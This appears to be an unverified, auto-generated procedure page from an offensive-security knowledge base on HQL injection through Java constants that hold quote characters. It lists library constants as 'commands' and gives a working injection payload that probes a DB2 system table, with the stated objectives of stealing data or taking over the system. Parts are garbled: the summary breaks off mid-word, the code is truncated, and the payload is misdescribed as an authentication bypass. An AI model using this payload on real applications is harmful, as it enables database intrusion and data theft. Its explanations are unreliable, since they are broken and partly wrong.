---
id: 146e6d75-f3f6-47dd-8960-48689a903bc9
name: Java Constant-Based HQL Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:33.450215+00:00'
updated_at: '2023-04-10T20:22:27.334895+00:00'
tags:
- '[[Hibernate Query Language Injection]]'
- '[[Java constants]]'
commands:
- '[[Define QUOTE constant]]'
- '[[Define QUOTE constant]]'
- '[[Define SINGLE_QUOTE_CHAR constant]]'
- '[[Define SINGLE_QUOTE constant]]'
- '[[Define SINGLE_QUOTE constant]]'
- '[[Define STRING_OPENING constant]]'
- '[[Define XML_CHAR_APOS constant]]'
- '[[SQL Injection attempt]]'
---

# Java Constant-Based HQL Injection

## Summary

Java Constant-Based HQL Injection is a type of attack where an attacker can inject malicious HQL queries into an application by manipulating Java constants. Hibernate Query Language (HQL) is a powerful tool used to query databases, but if it is not properly secured, it can be vulnerable to injectio

## Description

# Description

Java Constant-Based HQL Injection is a type of attack where an attacker can inject malicious HQL queries into an application by manipulating Java constants. Hibernate Query Language (HQL) is a powerful tool used to query databases, but if it is not properly secured, it can be vulnerable to injection attacks. By manipulating Java constants, an attacker can inject malicious HQL queries into an application, potentially gaining access to sensitive data or even taking control of the entire system. This type of attack can be difficult to detect and can cause significant damage to an organization if not mitigated properly.

## Requirements

1. Access to the application

1. Knowledge of Java constants and HQL

## Defense

1. Ensure that Java constants are properly secured and not accessible to attackers

1. Implement input validation and sanitization to prevent injection attacks

1. Regularly monitor and analyze application logs for suspicious activity

## Objectives

1. Inject malicious HQL queries into an application

1. Gain access to sensitive data or take control of the system

# Instructions

1. This class provides constants for SQL queries that can be used in Java code. These constants include quotes and characters that are used in SQL queries.

**Code**: [[public class Constants {
    public static final S]]

> The S_QUOTE constant provides a single quote character that is used in SQL queries. The HQL_PART constant provides a sample SQL query that can be used to retrieve data from a table named Post where the name column matches a specific value. The C_QUOTE_1, C_QUOTE_2, C_QUOTE_3, C_QUOTE_4, and C_QUOTE_5 constants provide different ways to represent a single quote character in Java code. These constants are useful when constructing SQL queries in Java code. However, it should be noted that the HQL_PART constant may not work for MySQL databases.

2. The 'data' field contains a list of commonly used constants in Java libraries. Each line contains the name of the constant and the name of the library it belongs to.

**Code**: [[org.apache.batik.util.XMLConstants.XML_CHAR_APOS  ]]

> These constants can be used in Java programs to avoid hardcoding values and to ensure consistency across the codebase. For example, instead of using the string literal "'" in a program, you can use the constant 'SINGLE_QUOTE' from the 'ICU4J' library. This makes the code more readable and easier to maintain.

**Command** ([[Define XML_CHAR_APOS constant]]):

```bash
org.apache.batik.util.XMLConstants.XML_CHAR_APOS
```

**Command** ([[Define SINGLE_QUOTE constant]]):

```bash
com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE
```

**Command** ([[Define SINGLE_QUOTE constant]]):

```bash
jodd.util.StringPool.SINGLE_QUOTE
```

**Command** ([[Define SINGLE_QUOTE_CHAR constant]]):

```bash
ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR
```

**Command** ([[Define STRING_OPENING constant]]):

```bash
cz.vutbr.web.csskit.OutputUtil.STRING_OPENING
```

**Command** ([[Define QUOTE constant]]):

```bash
com.sun.java.help.impl.DocPConst.QUOTE
```

**Command** ([[Define QUOTE constant]]):

```bash
org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE
```

3. The SQL Injection Attack is a technique used by hackers to inject malicious code into a website's database. This code can be used to steal sensitive information, modify or delete data, or even take control of the website. To prevent SQL Injection Attacks, it is important to use parameterized queries and sanitize user input.

In this specific example, the attacker is attempting to execute a SQL Injection Attack by using the 'dummy' parameter in the query. The injected code is designed to return a count of 1 from the sysibm.sysdummy1 table, which will always be true, allowing the attacker to bypass any authentication checks.

**Command** ([[SQL Injection attempt]]):

```bash
dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
```

## Commands Used

- [[Define QUOTE constant]]
- [[Define QUOTE constant]]
- [[Define SINGLE_QUOTE_CHAR constant]]
- [[Define SINGLE_QUOTE constant]]
- [[Define SINGLE_QUOTE constant]]
- [[Define STRING_OPENING constant]]
- [[Define XML_CHAR_APOS constant]]
- [[SQL Injection attempt]]

## Tags

- [[Hibernate Query Language Injection]]
- [[Java constants]]
